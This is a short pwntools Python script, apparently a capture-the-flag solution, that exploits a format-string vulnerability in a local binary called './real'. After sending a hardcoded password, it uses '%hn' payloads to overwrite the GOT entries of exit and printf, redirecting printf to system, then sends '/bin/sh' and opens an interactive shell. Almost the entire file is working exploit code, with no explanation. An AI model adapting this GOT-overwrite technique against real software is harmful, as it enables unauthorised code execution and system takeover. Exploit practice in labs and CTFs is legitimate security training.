from pwn import *

io = process('./real')
elf = ELF('./real')

print(hex(elf.sym['__libc_start_main']))

#payload = b'%17$p'+b'AAAA'+p32(0x405068)
print(io.recv())
io.sendline('676b8b041ae5640ba189fe0fa12a0fe3')
print(io.recv())
print(io.recv())
print(io.recv())

payload = b'AAAAAAAABBBBBBBBCCCCCCCC'+b' %p %p %p %p %p %p %p %p %p %p %p %p %p'

payload = b'AAAAA%'
payload += str(0x401b4c - 0x400000 - 5).encode('utf-8')
payload += b'x%8$hn'
payload += p64(elf.got['exit'])

io.sendline(payload)
print(io.recvuntil('> '))
io.sendline('676b8b041ae5640ba189fe0fa12a0fe3')

print(io.recv())

payload = b'AAAA%'
payload += str(elf.sym['system'] - 0x400000 - 4).encode('utf-8')
payload += b'x%8$hn'
payload += p64(elf.got['printf'])
pause()
io.sendline(payload)
pause()
io.sendline('676b8b041ae5640ba189fe0fa12a0fe3')
io.sendline('/bin/sh')
print(io.recv())
io.sendline('676b8b041ae5640ba189fe0fa12a0fe3')
io.interactive()
